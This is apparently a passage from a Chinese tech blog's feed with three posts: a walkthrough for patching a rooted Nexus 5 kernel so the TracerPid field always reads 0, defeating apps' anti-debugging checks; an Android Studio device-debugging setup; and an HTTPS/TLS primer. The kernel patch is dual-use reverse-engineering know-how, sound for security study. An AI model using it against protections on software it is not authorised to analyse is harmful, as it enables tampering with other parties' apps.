class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[your username]&gt;adb shell</span><br><span class="line">shell@hammerhead:/ $ su</span><br><span class="line">root@hammerhead:/ # cd /dev/block/platform/msm_sdcc.1/by-name</span><br><span class="line">root@hammerhead:/dev/block/platform/msm_sdcc.1/by-name # ls -al</span><br></pre></td></tr></table></figure></li></ol><p>输入以上命令即可找到boot的位置。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552572141/boposition_jqxant.png" alt></p><p>将boot导出成boot.img。这里一定要注意, 要按照你自己的情况将boot导出, 要修改<code>if=/dev/block/[实际boot文件夹名]</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd if=/dev/block/mmcblk0p19 of=/data/local/boot.img</span><br></pre></td></tr></table></figure><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552640930/bocorrect_whui56.png" alt></p><p>重新开一个命令行页面，或直接<code>exit</code>退出，输入如下指令：<br><code>adb root pull /data/local/boot.img boot.img</code></p><p>这里加了一个root是因为之前直接pull的时候说我权限不够。加了root之后发现还是一直失败, 就尝试先将boot.img存到<code>/sdcard/Download</code>下面之后直接用pull指令就成功了。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">root@hammerhead:/sdcard/Download$ su</span><br><span class="line">root@hammerhead:/sdcard/Download# cp /data/local/boot.img /sdcard/Download/boot.img </span><br><span class="line">root@hammerhead:/sdcard/Download# exit</span><br><span class="line">root@hammerhead:/$ exit</span><br><span class="line">C:/Users/[your username]&gt; adb pull /sdcard/Download/boot.img</span><br></pre></td></tr></table></figure></p><p>在哪个目录下pull的，文件就会存在哪个目录下。</p><ol start="2"><li>准备好bootimg-tools工具<br><code>git clone https://github.com/pbatard/bootimg-tools.git</code></li></ol><p>下载后打开文件夹到<code>[MinGW安装的目录]]\MinGW\msys\1.0</code>, 双击<code>msys.bat</code>即可进入到一个模拟Linux环境的GUN界面中。进入<code>[bootimg-tools所在文件夹]/bootimg-tools</code>(如果找不到的话可以用everything找找看), 用<code>make</code>指令生成二进制文件。</p><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552574870/afmake_l4lqwi.png" alt></p><p>将boot.img拷到<code>[bootimg-tools所在文件夹]\bootimg-tools\mkbootimg</code>文件夹下, 执行命令<code>./unmkbootimg -i boot.img</code>。(要记录下面输出的一大段字，之后要重新生成boot.img的时候直接复制修改成相应kernel文件名和输出文件名即可)<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552641959/succesun_umfiqv.png" alt></p><ol start="3"><li>提取原始zImage<br>复制<code>kernel</code>文件并将其重命名为<code>zImage.gz</code>。用<code>010 Editor</code>工具找到16进制<code>1f 8b 08 00</code>， 删掉查找到的位置的前面的所有数据,使文件变成标准的gzip压缩文件, 保存之后再执行命令<code>gunzip zImage.gz</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552650755/succesch_yoj1nf.png" alt></li></ol><p>到这里zImage文件就提取完成了。</p><h2 id="修改内核"><a href="#修改内核" class="headerlink" title="修改内核"></a>修改内核</h2><h3 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h3><p>我这里用的是IDA 7.0</p><h3 id="正式开始"><a href="#正式开始" class="headerlink" title="正式开始"></a>正式开始</h3><h4 id="用IDA直接打开zImage文件-并做如下改动"><a href="#用IDA直接打开zImage文件-并做如下改动" class="headerlink" title="用IDA直接打开zImage文件, 并做如下改动"></a>用IDA直接打开zImage文件, 并做如下改动</h4><p><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552653260/IDA1_zugiws.png" alt></p><p>点击OK之后, 继续按照下面修改。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552659040/IDA2_t9pvte.png" alt></p><h4 id="定位函数位置"><a href="#定位函数位置" class="headerlink" title="定位函数位置"></a>定位函数位置</h4><p>打开命令提示符, 输入如下指令关闭符号屏蔽, 并查看函数地址, 因为在IDA中查看二进制文件不好直接用函数名进行定位。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\[your username]&gt;adb shell</span><br><span class="line">shell@hammerhead:/ $ su</span><br><span class="line">root@hammerhead:/ # echo 0 &gt; /proc/sys/kernel/kptr_restrict /*关闭符号屏蔽*/</span><br><span class="line">root@hammerhead:/ # cat /proc/kallsyms |grep proc_pid_status</span><br><span class="line">root@hammerhead:/proc # cat /proc/kallsyms |grep __task_pid_nr_ns</span><br></pre></td></tr></table></figure></p><p>函数地址如下：<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552655198/fuposition_lrj63p.png" alt></p><p>在IDA中按下快捷键G跳转到c01b0884(__task_pid_nr_ns函数)<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552659250/f1_otrhpf.png" alt></p><p>之后点击函数名c01b0884(__task_pid_nr_ns函数), 按下快捷键X, 会弹出交叉引用, 在其中查找我们上面找的第二个函数c02ba04c( proc_pid_status)的位置。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552659761/f2_iuuo1l.png" alt><br>好的, 上面选中的并不是我想找的函数TAT。这个时候, 就在IDA界面中按下<code>Shift+F12</code>, 在字符串界面查找<code>TracerPid</code>。找到之后双击查询后的结果。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552661104/f3_zrynlg.png" alt><br>IDA在解析的时候没有解析好这个文件, 出现了下面的情况。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552661543/f4_tn3sq3.png" alt><br>这时候选中<code>S</code>的位置即<code>0x53</code>按下<code>A</code>, 即可正常解析。如果解析出来还不是下面这种格式，可以鼠标左键选中该字符串的所有内容再按一次<code>A</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552703909/CHSU_cre1cq.png" alt><br>如果字符串都解析出来之后, 还是识别不出来c02ba04c( proc_pid_status)函数的话, 直接<code>G</code>跳转到c02ba04c, 并按下C, 但是识别的函数也不是正确的。所以这里采用第三篇参考文章的方法, 直接修改TracePid字符串。</p><h4 id="修改TracePid字符串"><a href="#修改TracePid字符串" class="headerlink" title="修改TracePid字符串"></a>修改TracePid字符串</h4><p>(1) 选中<code>TracePid</code>中的<code>%d</code><br>    <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552706938/S1_g980jo.png" alt></p><p>(2) 将<code>TracePid</code>中的<code>%d</code>改为<code>0\t</code>, 选中<code>%d</code>后按下<code>Alt</code>+<code>4</code>。<br>    <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552707440/p1_mebj3m.png" alt></p><p>上图中第四行第一个<code>%d</code>就是我们要修改的(TracerPid后的字符串), 十六进制为<code>25 64</code>。点击<code>25</code>前面按下<code>F2</code>, 输入<code>30 09</code>, 再按下<code>F2</code>就修改成功了。<br>    <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552708361/p2_luiaxd.png" alt></p><p>最后保存修改的内容, 按下图点开之后直接点OK即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552708651/p3_zozpyy.png" alt></p><h4 id="修改kernel文件"><a href="#修改kernel文件" class="headerlink" title="修改kernel文件"></a>修改kernel文件</h4><p>在MinGW命令行界面输入命令<code>gzip -n -f -9 zImage</code>, 压缩修改好的文件<code>zImage</code>生成<code>zImage.gz</code>。用<code>010 Editor</code>打开文件<code>kernel</code>, 并在<code>kernel</code>中查找<code>1F 8B 08 00</code>。(下图是覆盖完成的样子)<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1553071178/1553071092_1_fg4s6b.png" alt></p><p>选中<code>1F 8B 08 00</code>位置之后，点开<code>Edit</code>-&gt;<code>Insert/Overwrite</code>-&gt;<code>Overwrite File...</code>, 选择<code>zImage.gz</code>文件即可, 这样就不用自己计算文件大小并且直接覆盖了, 完成之后点击保存为新的文件<code>boot-new.img</code>。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552722307/succ_eyefab.png" alt></p><p>使用执行unmkbootimg生成的命令, 修改-o参数名(要输出的文件名), 直接拷贝到MinGW命令行中直接执行。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">    $ mkbootimg --base 0 --pagesize 2048 --kernel_offset 0x00008000 --ramdisk_offset 0x02900000 --second_offset 0x00f00=</span><br><span class="line">000 --tags_offset 0x02700000 --cmdline &apos;console=ttyHSL0,115200,n8 androidboot.hardware=hammerhead user_debug=31 max</span><br><span class="line">cpus=2 msm_watchdog_v2.enable=1&apos; --kernel kernel --ramdisk ramdisk.cpio.gz -o boot-new.img</span><br></pre></td></tr></table></figure></p><ol start="5"><li>刷机<br>我这里用的是<a href="http://www.kgfanr.com/articles/3019.html" target="_blank" rel="noopener">Nexus 5</a>, 直接在关机状态下按<code>音量键-</code>和<code>开机键</code>(或输入命令<code>adb reboot bootloader</code>)即可进入fastboot状态。在命令行中输入<code>fastboot flash boot boot-new.img</code>, 之后再输入<code>fastboot reboot</code>即可。<br><img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552722558/succ2_yzvx0w.png" alt></li></ol><p>刷完倒是能正常开机了, 但是我手机又要重新root了…..(这个时候有尝试过用SuperSU刷成砖, 还是用magisk+twrp比较好)</p><h1 id="参考材料-文章"><a href="#参考材料-文章" class="headerlink" title="参考材料\文章"></a>参考材料\文章</h1><p><a href="https://www.xmsec.cc/re-modify-kernel-bypass-antidebug/" target="_blank" rel="noopener">逆向修改内核，绕过TracerPID反调试</a><br><a href="https://sourceforge.net/p/mingw/bugs/1552/" target="_blank" rel="noopener">make: cc: Command not found</a><br><a href="https://blog.csdn.net/jiangwei0910410003/article/details/65936634" target="_blank" rel="noopener">Android逆向之旅—应用的”反调试”方案解析(附加修改IDA调试端口和修改内核信息)</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;准备工作&quot;&gt;&lt;a href=&quot;#准备工作&quot; class=&quot;headerlink&quot; title=&quot;准备工作&quot;&gt;&lt;/a&gt;准备工作&lt;/h1&gt;&lt;h2 id=&quot;Windows下Linux环境准备&quot;&gt;&lt;a href=&quot;#Windows下Linux环境准备&quot; class=&quot;he
      
    
    </summary>
    
    
      <category term="Android" scheme="http://Se8S0n.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>用Android Studio调试Nexus 5</title>
    <link href="http://Se8S0n.github.io.git/2019/03/09/%E7%94%A8Android-Studio%E8%B0%83%E8%AF%95Nexus-5/"/>
    <id>http://Se8S0n.github.io.git/2019/03/09/用Android-Studio调试Nexus-5/</id>
    <published>2019-03-10T01:55:41.000Z</published>
    <updated>2021-08-05T06:51:27.423Z</updated>
    
    <content type="html"><![CDATA[<h2 id="环境说明"><a href="#环境说明" class="headerlink" title="环境说明"></a>环境说明</h2><p>Android 4.4<br>Windows 10</p><h2 id="Nexus-5-准备"><a href="#Nexus-5-准备" class="headerlink" title="Nexus 5 准备"></a>Nexus 5 准备</h2><ol><li><p>找到版本号, 并在版本号所在位置点击7次, 打开开发者选项。版本号位置：设置(Setting)-&gt;关于手机(About phone)-&gt;版本号(Build number)</p></li><li><p>打开开发者选项(Developer options),勾选USB debugging。</p></li><li><p>在命令行中输入<code>adb devices</code>,有个前提就是需要将<code>android_sdk/platform-tools/</code>设为全局变量，或者进入到该文件夹中才能使用adb。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552126212/1_tcgmnn.png" alt></p></li><li><p>在网上搜<a href="https://www.kingoapp.com/android-root/download.htm" target="_blank" rel="noopener">Kingo root</a>, 将Nexus 5 与电脑连接, 将手机root, 提示用Kingo root的时候需要科学上网，不然就不能更新库文件啥的。(其实这一步要不是因为之后怕IDA调试的时候要用到, 不然这一步是可以直接省去的)不过在找root工具的时候，发现root工具好像是利用android系统的漏洞实现提权的，以后有时间好好了解一下。</p><h2 id="Android-Studio-准备"><a href="#Android-Studio-准备" class="headerlink" title="Android Studio 准备"></a>Android Studio 准备</h2></li><li><p>点开Edit Configurations…<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552204133/1_vutojr.png" alt></p></li><li><p>将Target选项改选为<code>USB Device</code>，据说，在windows上需要下载USB drive，不知道是最新版的改了还是我之前就下载了，很奇妙地能直接使用。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552204472/1_hhkcx4.png" alt></p></li><li><p>在Android Studio中查看是否已经连接上真机。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552205774/a_xdgmcj.png" alt></p></li><li><p>然后点击下图红框框中的按钮, 就可以直接将apk安装到真机上并且直接运行了, 快乐。<br> <img src="https://res.cloudinary.com/dq4c0zqqy/image/upload/v1552205588/1_wwaqrx.png" alt></p></li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;环境说明&quot;&gt;&lt;a href=&quot;#环境说明&quot; class=&quot;headerlink&quot; title=&quot;环境说明&quot;&gt;&lt;/a&gt;环境说明&lt;/h2&gt;&lt;p&gt;Android 4.4&lt;br&gt;Windows 10&lt;/p&gt;
&lt;h2 id=&quot;Nexus-5-准备&quot;&gt;&lt;a href=&quot;#Ne
      
    
    </summary>
    
    
      <category term="Android" scheme="http://Se8S0n.github.io.git/tags/Android/"/>
    
  </entry>
  
  <entry>
    <title>HTTP系列(五)：安全</title>
    <link href="http://Se8S0n.github.io.git/2018/09/11/HTTP%E7%B3%BB%E5%88%97(%E4%BA%94)/"/>
    <id>http://Se8S0n.github.io.git/2018/09/11/HTTP系列(五)/</id>
    <published>2018-09-11T15:35:09.000Z</published>
    <updated>2021-08-05T06:51:27.315Z</updated>
    
    <content type="html"><![CDATA[<p>如果, 你伴随HTTP系列一路成长, 那么现在的你, 已经可以乘船开启(学习)HTTP安全之旅。我保证,你会很享受这个学习过程。🙂</p><p>许多公司都是安全漏洞的受害者, 一些知名的公司, 比如Dropbox(支持文件同步、备份、共享云存储的软件)、Linkedin(领英, 全球最大职业社交网站)、MySpace(社交网站)、Adobe、索尼和福布斯等许多公司遭受过恶意攻击。除此之外, 许多用户也被(恶意攻击公司的事件)危及过, 你, 很可能曾是受害者之一。🙂</p><p>你可以在<a href="https://haveibeenpwned.com/" target="_blank" rel="noopener">Have I Been Pwned</a>查询你是否是受害者之一。</p><p>我的电子邮件地址出现在4个不同的存在安全漏洞的网站上。</p><p>Web应用安全涉及面广, 因此, 只有一篇文章难以涵盖所有的知识。不过, 本文可作为(Web应用安全的)启蒙。首先, 让我们来了解一下, HTTP协议如何安全地通信。</p><p>本文是<a href>HTTP系列</a>的第五部分。</p><p>文章概要：</p><ul><li><a href>你真的需要HTTPS吗?</a></li><li><a href>HTTPS的基本概念</a><ul><li><a href>SSL vs TLS</a></li><li><a href>TLS握手</a></li><li><a href>证书(Certificate)及证书认证(CAs, Certification Authorities)</a></li><li><a href>证书链(certificate chain)</a></li></ul></li><li><a href>HTTPS的不足</a></li></ul><p>文章涵盖了大量的内容, 不管怎样, 我们从头学起吧！</p><h2 id="你真的需要HTTPS吗"><a href="#你真的需要HTTPS吗" class="headerlink" title="你真的需要HTTPS吗?"></a>你真的需要HTTPS吗?</h2><p>你可能认为, 不是所有的网站都需要安全防护的。如果一个网站不提供敏感信息, 也不能以任何形式上传数据, 仅仅是为了在URL栏上可以显示绿色的标志(网站安全的标志), 就去购买证书和降低访问网站的速度, 这看起来像是想要杀猪却用了宰牛刀。</p><p>如果有一个属于你的网站, 你就会知道加载速度——越快越好——对网站来说是至关重要的, 因此, 你不会想给你的网站增加负担。</p><p>从HTTP迁移到HTTPS是一个痛苦的过程, 何必为了维护原本就不用被保护的网站遭受这样的痛苦呢?你要考虑的第一件事, 就是出钱买网站的安全——因为购买证书对于一般的小公司或个人来说是一笔很大的费用。</p><p><em>注: 听说已经有机构开始颁发免费证书, 详情可以从<a href="https://blog.csdn.net/ithomer/article/details/78075006" target="_blank" rel="noopener">十大免费SSL证书：网站免费添加HTTPS加密</a>中了解</em></p><p>现在就让我们一起来看看, (为安全)惹上这个麻烦到底值不值得。</p><h3 id="HTTPS给报文加密并防止中间人攻击"><a href="#HTTPS给报文加密并防止中间人攻击" class="headerlink" title="HTTPS给报文加密并防止中间人攻击"></a>HTTPS给报文加密并防止中间人攻击</h3><p>在之前的HTTP系列文章中, 我们谈论了不同的HTTP认证机制及其安全缺陷。然而, 不管是basic认证还是digest认证, <strong>都不能阻止中间人攻击</strong>。中间人攻击——中间人, 就是恶意介入用户与网站通信的一批人——的目的是拦截双方通信的原始报文(如果有需要, 还可以修改报文), 通过转发拦截的报文, (这个攻击行为)就能不被发现。<br><img src="https://code-maze.com/wp-content/uploads/2017/07/MITM.png" alt><br>原本参与通信的人可能不能察觉到他们的通信正在被监听。</p><p>HTTPS通过加密通信(报文)防止中间人攻击, 但是这并不意味着(双方的)通信不会再被监听, 它仅仅阻止了那些查看和拦截(双方通信)报文的人看报文内容罢了。如果中间人想要将报文解密, 那么他必须要有解密的密钥。之后, 你就会知道, 这个密钥是如何起作用的。</p><p>让我们继续往下走。</p><h3 id="HTTPS——影响搜索排名的因素"><a href="#HTTPS——影响搜索排名的因素" class="headerlink" title="HTTPS——影响搜索排名的因素"></a>HTTPS——影响搜索排名的因素</h3><p>不久之前(2014年), <a href="https://www.wosign.com/news/Google_https.htm" target="_blank" rel="noopener">Google让HTTPS成为一个影响(搜索算法)排名的因素</a>。</p><p>这意味着什么呢？</p><p>这意味着, 如果你是一个关心Google搜索排名的网络管理员, 你的网站一定要用HTTPS协议。尽管HTTPS没有内容质量、反向链接这些因素影响力大, 但它还是很重要的。</p><p>Google通过这项举措鼓励网站管理员尽快(从HTTP)过渡到HTTPS, 从而提高互联网整体的安全性。</p><h3 id="证书-完全免费"><a href="#证书-完全免费" class="headerlink" title="(证书)完全免费"></a>(证书)完全免费</h3><p>要架设HTTPS网站, 就需要一个证书来解决证书认证的问题。从前, 证书费用高昂, 并且年年需要更新。</p><p>如今, 感谢<a href="https://letsencrypt.org/" target="_blank" rel="noopener">Let’s encrypt</a>的小伙伴们, 让我们付得起买证书的钱(只要0元!)。那些证书是真的完全免费的！</p><p>Let’s encrypt的证书安装起来很简单, 这离不开其背后大公司的支持和超棒的社区人员（的努力）。看看Let’s encrypt的赞助商和支持(Let’s encrypt)的公司的名单, 其中可能有你认识的公司。</p><p>Let’s encrypt只提供域名认证(DV)证书, 不提供组织认证(OV)证书和扩展验证(EV)证书。DV证书只能用90天, 不过更新起来很容易。</p><p>和其他(好的)技术相同, Let’s encrypt证书也有不好的一面。正因为现在证书获取起来很容易, <a href="https://www.bleepingcomputer.com/news/security/14-766-lets-encrypt-ssl-certificates-issued-to-paypal-phishing-sites/" target="_blank" rel="noopener">钓鱼网站也开始利用起这些证书了</a>。</p><h3 id="关于-传输-速度"><a href="#关于-传输-速度" class="headerlink" title="关于(传输)速度"></a>关于(传输)速度</h3><p>一提到HTTPS, 许多人就会认为它给速度带来了了额外的开销。简单地用<a href="http://httpvshttps.com/" target="_blank" rel="noopener">httpvshttps.com</a>来测试一下。</p><p>下面是测试结果:<br>！<a href="https://code-maze.com/wp-content/uploads/2017/07/httpvshttpsresults-1.png" target="_blank" rel="noopener"></a><br>所以这里发生了什么?为什么HTTPS比HTTP快那么多?这怎么可能!</p><p>HTTPS是使用HTTP 2.0协议的必要条件。</p><p>如果我们查看网络选项卡, 我们可以看到在使用HTTPS时，图像是通过HTTP 2.0协议加载的, 除此之外, 流量看起来也很不一样。</p><p>HTTP 2.0是继HTTP/1.1之后成功的HTTP协议。</p><p>在HTTP/1.1的基础之上, HTTP 2.0增加了许多优点:</p><ul><li>用二进制(传输)取代文本(传输)</li><li>可通过单个TCP连接并行发送多个请求</li><li>采用<a href="http://www.cnblogs.com/ghj1976/p/4586529.html" target="_blank" rel="noopener">HPACK</a>压缩报文首部减少(流量)开销</li><li>使用新的应用层协议协商(Application-Layer Protocol Negotiation，简称ALPN)扩展更快地加密通信。</li><li>可降低RTT(round trip times, 往返时延), 让网站加载的速度更快。</li><li>还有许多其他的优点</li></ul><h3 id="不使用HTTPS-浏览器表示拒绝。"><a href="#不使用HTTPS-浏览器表示拒绝。" class="headerlink" title="不使用HTTPS?浏览器表示拒绝。"></a>不使用HTTPS?浏览器表示拒绝。</h3><p>如果你现在还不相信——使用HTTPS是必要的——那么你应该知道, 现在一些浏览器已经开始举起的大旗, 反对(传输)那些未经加密内容。在16年9月份的时候, Google发布博文明确地说明了Chrome浏览器会怎么对待那些不安全的网站。</p><p>现在, 让我们来看一下Chrome 56的前后变化吧!</p><p><img src="https://code-maze.com/wp-content/uploads/2017/07/https-shaming-1.png" alt></p><p>下面是最终的效果。</p><p><img src="https://code-maze.com/wp-content/uploads/2017/07/https-shaming-2.png" alt></p><p>你现在相信了吧！😀</p><h3 id="迁移到HTTPS的过程很复杂"><a href="#迁移到HTTPS的过程很复杂" class="headerlink" title="迁移到HTTPS的过程很复杂"></a>迁移到HTTPS的过程很复杂</h3><p>(迁移过程复杂)这是过去遗留下来的问题。因为历史悠久的网站之前用HTTP协议上传了大量的资源, 这让迁移至HTTPS对这些网站来说就更加困难了, 不过托管的平台通常都会让这个过程变得简单一点。</p><p>大部分托管平台都提供了自动往HTTPS迁移的方法, 点击选项栏的一个按钮就可以轻松迁移。</p><p>如果你打算搭建一个基于HTTPS的网站, 你需要先去确认一下, 托管平台是否有提供往HTTPS迁移的方法。或者, 有一个脚本, 可以通过Let’s encrypt和设置服务器配置让你自己解决迁移的问题。</p><p>以上, 都是要迁移到HTTPS的原因。有什么理由不去做呢?</p><p>文章写到这里, 希望我已经说服你, 用HTTPS是有必要的, 并且这可以让你有动力将网站往迁移HTTPS迁移, 知道HTTPS是如何工作的。</p><h2 id="HTTPS的基本概念"><a href="#HTTPS的基本概念" class="headerlink" title="HTTPS的基本概念"></a>HTTPS的基本概念</h2><p>HTTPS(Hypertext Transfer Protocol Secure, 超文本传输安全协议)准确地说, 是客户端和服务器在用HTTP进行通信的基础上, 增加使用安全的SSL/TLS的协议。</p><p>在之前的HTTP系列文章中, 我们已经了解过HTTP的工作原理了, 不过SSL/TLS却没有提到。SSL和TLS到底是什么?为什么要使用他们?</p><p>下面, 就让我们来了解一下。</p><h3 id="SSL-vc-TLS"><a href="#SSL-vc-TLS" class="headerlink" title="SSL vc TLS"></a>SSL vc TLS</h3><p>SSL(Secure Socket Layer, 安全套接层)和TLS(Transport Layer Security, 传输安全协议)可互换使用, 但实际上, 现在提到SSL可能就是在说TLS。</p><p>SSL一开始是由网景(Netscape)公司提出的, 不过它的1.0版本早已停用。SSL的2.0版本和3.0版本在1995、1996年相继现世,这两个版本在出现之后, 即便是之后TLS已经开始推行了, 也沿用了很长一段时间(至少对IT行业来说, 时间挺长的)。直到2014年<a href="https://www.puritys.me/zh_cn/docs-blog/article-376-HTTP-:-SSLv3-%E6%BC%8F%E6%B4%9E---Poodle-%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener">Poodle攻击</a>发生之后才有所改变。当时服务器支持从TLS降级到SSL,这是Poodle攻击如此成功的主要原因。</p><p>SSL一开始是由网景(Netscape)公司提出的, 不过它的1.0版本早已停用。SSL的2.0版本和3.0版本在1995、1996年相继现世, 即便是之后TLS已经开始推行了, 也沿用了很长一段时间(至少对IT行业来说, 时间挺长的)。2014年, 当时服务器支持从TLS降级到SSL, 这是<a href="https://www.puritys.me/zh_cn/docs-blog/article-376-HTTP-:-SSLv3-%E6%BC%8F%E6%B4%9E---Poodle-%E6%94%BB%E5%87%BB.html" target="_blank" rel="noopener">Poodle攻击</a>发生之后如此成功的主要原因。</p><p>从此之后, 服务器<strong>降级到SSL的功能已经完全消失了</strong>。</p><p>如果你用<a href="https://www.ssllabs.com/ssltest/" target="_blank" rel="noopener">Qualys SSL Labs tool</a>检查你或其他人的网站, 你可能会看到这个:<br><img src="https://code-maze.com/wp-content/uploads/2017/07/www.code-maze.com-Powered-by-Qualys-SSL-Labs.png" alt><br>你可以看到, 根本不支持SSL 2和3, 而TLS 1.3还未启用。</p><p>不过, 因为SSL流行了很长一段时间, 它已经成为了大部分人熟悉的术语, 现在被用于许多方面。 因此, 当你听到有人用SSL代替TLS, 这是个历史遗留问题, 别想少了, 他们真正想说的不是SSL。</p><p>因为我们要摆脱那种表达方式, 所以从现在开始, 我会用TLS, 毕竟这个会更加准确。</p><p>那么, 客户端和服务器到底是怎样建立安全连接的？</p><h3 id="TLS握手"><a href="#TLS握手" class="headerlink" title="TLS握手"></a>TLS握手</h3><p>客户端和服务器在进行真正的、加密过的通信之前会有一个”TLS握手”的过程。</p><p>下面是TLS的工作原理(非常简单, 后面有附加连接)。<br><img src="https://code-maze.com/wp-content/uploads/2017/07/TLS-handshake.png" alt></p><p>在建立完连接之后, 会开始加密通信。</p><p>真的TLS握手机制会比这个图更加复杂, 不过, 只是为了实现HTTPS协议, 你不必了解所有的真实的细节。</p><p>如果你想确切了解 TLS 握手的工作原理, 可以在<a href="https://www.ietf.org/rfc/rfc2246.txt" target="_blank" rel="noopener">RFC 2246</a>中找找看。</p><p>TLS握手的过程中, 发送的证书扮演着什么样的角色?又是怎样颁发的呢?让我们来一起看看吧!</p><h3 id="证书-Certificate-及证书认证-CAs-Certification-Authorities"><a href="#证书-Certificate-及证书认证-CAs-Certification-Authorities" class="headerlink" title="证书(Certificate)及证书认证(CAs, Certification Authorities)"></a>证书(Certificate)及证书认证(CAs, Certification Authorities)</h3><p>证书是通过 HTTPS 进行安全通信的关键部分, 它由受信任的证书颁发机构颁发。</p><p>数字证书让网站的用户在使用网站时可以以安全的方式进行通信。</p><p>比如, 在浏览我的文章时, 证书是这个样子的:<br><img src="https://code-maze.com/wp-content/uploads/2017/07/Code-Maze-Certificate-modified.png" alt></p><p>如果你用的是Chrome浏览器, 你可以按F12打开开发者工具安全栏查看证书。</p><p>我想要点明两件事。在上图的第一个红色框框里, 你可以看到证书的真实目的。它是用来确保你访问的是正确的网站的如果有些网站伪造成你真正想进行通信的网站, 你的浏览器一定会提醒你的。</p><p>第二, 浏览器<strong>左边最上面的那个绿色的”安全”标志, 只能说明你是在和有证书的网站在进行通信</strong>, 并不能证明你是在与原本想通信的网站进行通信。因此, 要小心了。如果恶意攻击者有一个合法的域名及证书的话, 那么他们就能窃取你的身份凭证了。🙂</p><p><em>注: 有些钓鱼网站, 通过用与大型网站相似的域名申请域名证书(比如用Web1.com替代原本的Webone.com), 瞒过了浏览器的法眼, 骗取用户的身份凭证或其他重要信息。</em></p><p>扩展验证证书(EV, Extended validation certificates), 换句话说, 就是用来证明网站是由合法实体(域名持有者或公司)持有的证书。不过, 现在EV证书的可用性还存在着争议, 因为可能不适用于互联网上的特殊用户(比如为经过浏览器安全功能训练的用户)。你可以在URL栏左方看到EV证书持有者的名字。例如, 当你访问twitter.com的时候, 你可以看到:<br><img src="https://code-maze.com/wp-content/uploads/2017/07/Twitter-EV-certificate.png" alt></p><p>这意味着, 网站用EV证书来证明其背后的持有者(或公司)。</p><h3 id="证书链-certificate-chain"><a href="#证书链-certificate-chain" class="headerlink" title="证书链(certificate chain)"></a>证书链(certificate chain)</h3><p>任何一个服务器都可以(向客户端)发送数字证书, 并以此声称它们就是你想要访问的那个服务器。所以, 到底是什么让你使用的浏览器信任服务器返回的证书呢?</p><p>这里, 就要引入根证书了。通常, 证书都是链接起来的,<br>(链接最顶层的)根证书是你的电脑全心全意地信任的一个证书。</p><p>我博客的证书链是这个样子的:<br><img src="http://res.cloudinary.com/dq4c0zqqy/image/upload/v1537102525/certificate-chain-1_xpgrij.png" alt></p><p>最底层的是我的域名证书, 这是由它的上一级的证书签署的, 它的上一级证书是上上级证书签署的…这样循环往复直到最顶层的根证书。</p><p>不过, 到底是谁签署的根证书呢？</p><p>好吧, 告诉你, 是它自己给自己签署的!😀</p><p><img src="https://code-maze.com/wp-content/uploads/2017/07/root-certificate.png" alt><br>颁发给: 域根证书; 颁发者: 域根证书。</p><p>你的电脑和浏览器会有一个信任的根证书名单, 这些根证书依靠确认你浏览的域名是通过验证的(来保证服务器端证书是值得信任的)。若证书链由于某些原因断裂了——当时我在我博客上开启了CDN[内容分发网络], 就出现了这样的问题——你的电脑会显示你的网站是”不安全”的。</p><p>在键盘上按win+R输入” certmgr.msc”后运行证书管理器, 就可以在windows系统上查询信任的根证书的名单。然后, 你可以在受信任的根证书颁发机构文件夹中找到电脑信任的证书。这个名单适用于Windows系统、IE浏览器、Chrome浏览器和Firefox浏览器, 换言之, 他们自己在管理自己(信任的证书)的名单。</p><p>通过交换证书, 客户端和服务器能确认与对方进行通信的人是正确的, 并且可以开始加密传输报文了。</p><h2 id="HTTPS的不足"><a href="#HTTPS的不足" class="headerlink" 